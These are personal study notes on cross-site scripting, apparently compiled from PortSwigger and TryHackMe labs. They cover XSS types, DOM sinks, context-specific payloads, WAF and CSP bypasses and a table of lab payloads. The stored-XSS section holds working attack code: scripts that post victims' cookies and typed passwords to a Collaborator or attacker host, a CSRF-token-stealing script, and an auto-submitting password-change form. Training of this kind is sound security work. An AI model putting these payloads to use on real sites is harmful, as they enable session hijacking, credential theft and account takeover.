---
layout: default
title: "XSS"
parent: "Web Application"
nav_order: 36
---

# Cross-Site Scripting (XSS)

Resources:
- [Burp XSS Cheat Sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
- [notchxor OSCP XSS Cheatsheet](https://notchxor.github.io/oscp-notes/2-web/xss/)

---

## Types of XSS

- **Reflected** — injected script is reflected off the server in an immediate response
- **Stored** — injected script is stored and served to other users
- **DOM-based** — vulnerability exists in client-side code, attacker-controllable value (`source`) passed into a dangerous function (`sink`)

---

## Basic Payloads

Break out of an `img` or other attribute:
```html
"><svg onload=alert(1)>
"><script>alert("1")</script>
```

Error-based:
```html
<img src=1 onerror=alert(1)>
```

Stored in `href`:
```
javascript:alert(1)
```

---

## DOM-Based XSS

DOM-based vulnerabilities arise when JavaScript takes an attacker-controllable value (source) and passes it into a dangerous function (sink).

Most common source: the URL, typically accessed via `window.location`.

**Methodology:** Inject a random alphanumeric string into the source (e.g., `location.search`). Use DevTools (not view-source) to find where your string appears in the DOM.

### Dangerous Sinks

JavaScript sinks:
```js
document.write()
document.writeln()
document.domain
element.innerHTML
element.outerHTML
element.insertAdjacentHTML
element.onevent
```

jQuery sinks:
```js
add(), after(), append(), animate(), insertAfter(), insertBefore(), before(),
html(), prepend(), replaceAll(), replaceWith(), wrap(), wrapInner(), wrapAll(),
has(), constructor(), init(), index(), jQuery.parseHTML(), $.parseHTML()
```

### DOM XSS Lab Examples

**jQuery anchor href (location.search source):**
- Context is inside `href` attribute — use `javascript:` scheme
- `/#<img src=o onerror='alert()'>`

**document.write in select element:**
- Inject via `storeId` parameter to escape the select element:
  `product?productId=1&storeId="></select><img%20src=1%20onerror=alert(1)>`

**AngularJS expression with angle brackets encoded:**
- If page is wrapped in `ng-app` directive: `{{$on.constructor('alert(1)')()`}}`

**Reflected DOM XSS with eval():**
- Site escapes `"` but not `\`
- Payload: `\"-alert(1)}//`
- Result: `{"searchTerm":"\\"-alert(1)}//", "results":[]}`
- The double-backslash cancels the escaping

**Stored DOM XSS with partial HTML escaping:**
- If `replace('<', '&lt;')` only replaces the first occurrence:
- `<><img src=1 onerror=alert(1)>` — the first `<>` gets encoded, subsequent ones do not

---

## Reflected XSS

### Breaking Out of Strings

Bypass WAF / restricted characters using `throw`:
```js
onerror=alert;throw 1
```

### HTML Encoding Bypass
When in a quoted tag attribute (like `onclick`), HTML-encode the payload:
- Context: `<a href="#" onclick="... var input='controllable data here'; ...">`
- Payload: `&apos;-alert(document.domain)-&apos;`
- Browser HTML-decodes the `onclick` value before interpreting JavaScript

### JavaScript Template Literals
If context is inside backtick string:
```js
${alert(document.domain)}
```

### Lab Payloads Reference

| Scenario | Payload |
|----------|---------|
| Angle brackets HTML-encoded | `"onmouseover='alert(1)'` |
| JS string with angle brackets encoded | `'-alert(1)-'` |
| JS string with angle brackets + double quotes encoded, single quotes escaped | `\';alert(document.domain)//` |
| Single quote + backslash escaped | `</script><img src=1 onerror=alert(1)>` |
| Template literal | `${alert(document.domain)}` |
| onclick with HTML-encoded quotes | `http://foo?&apos;-alert(1)-&apos;` |

### Most Tags Blocked
1. Use Burp Intruder with `<§§>` payload position and XSS cheat sheet tag list
2. Find allowed tag (e.g., `body`)
3. Find allowed event (e.g., `onresize`)
4. Deliver via exploit server:
   `<iframe src="https://LAB-ID.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>`

### SVG Allowed
`https://LAB-ID.web-security-academy.net/?search=%22%3E%3Csvg%3E%3Canimatetransform%20onbegin=alert(1)%3E`

### Canonical Link Tag
```
https://LABID.web-security-academy.net/?'accesskey='x'onclick='alert(1)
```
Creates: `<link rel="canonical" accesskey="X" onclick="alert(1)" />`

### Strict CSP with Dangling Markup
- Check for missing `form-action` directive in CSP
- Inject a button with `formaction` pointing to exploit server:
  `?email=foo@bar%22%3E%3Cbutton%20formaction=%22https://exploit-server.com%22%3EClick%20me%3C/button%3E`

---

## Stored XSS

### Stored in `onclick` Event
When input is placed inside an `onclick` event with angle brackets and double quotes encoded:
- Post a website URL: `http://foo?&apos;-alert(1)-&apos;`
- The `&apos;` is decoded from HTML before JavaScript executes

### Lab: Stealing Cookies via Fetch
Post in a comment:
```html
<script>
fetch('https://BURP-COLLABORATOR-SUBDOMAIN', {
  method: 'POST',
  mode: 'no-cors',
  body: document.cookie
});
</script>
```
Check the **request** in Collaborator (the cookie comes from the victim's browser making the request).

### Lab: Capturing Passwords
```html
<input name=username id=username>
<input type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{
  method:'POST',
  mode: 'no-cors',
  body:username.value+':'+this.value
});">
```

### Lab: XSS to Bypass CSRF Defenses
```js
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/my-account',true);
req.send();
function handleResponse() {
    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/my-account/change-email', true);
    changeReq.send('csrf='+token+'&email=test@test.com')
};
</script>
```
Useful pattern for stealing any named token value from a page.

---

## Additional XSS Concepts (THM)

### What Makes XSS Possible
- Insufficient input validation and sanitization
- Lack of output encoding — characters like `<`, `>`, `"`, `'`, and `&` must be properly HTML-encoded
- Framework and language vulnerabilities
- Third-party libraries

### Injection Context and Evasion
The injected payload will land in one of three contexts:

**Between HTML tags**: Use `<script>alert(document.cookie)</script>` directly.

**Within an HTML tag**: Must escape the tag first:
- `><script>alert(document.cookie)</script>`
- `"><script>alert(document.cookie)</script>`

**Inside JavaScript**: Break out of the string context (e.g., close the string with `'` or `"`).

### Labs

## Labs

### Lab: What's Your Name (THM)
Cookie theft via stored XSS in a chat application (worldwap.thm):

```html
<script>fetch('http://kaliIP/?'+btoa(document.cookie));</script>
```
Add the captured cookie to both `http://login.worldwap.thm/login.php` and `http://worldwap.thm/public/html/` to gain admin access.

The chat bot clicks links sent to it, enabling stored XSS or CSRF payloads. Password change via XSS:
```html
<script>fetch('/change_password.php',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:"new_password=party1234"});</script>
```

Or via a CSRF form sent as a link to the bot:
```html
<!DOCTYPE html>
<html>
<head><title>CSRF</title></head>
<body>
<form id="autosubmit" action="http://login.worldwap.thm/change_password.php" enctype="application/x-www-form-urlencoded" method="POST">
<input name="new_password" type="hidden" value="party1234" />
</form>
<script>document.getElementById("autosubmit").submit();</script>
</body>
</html>
```
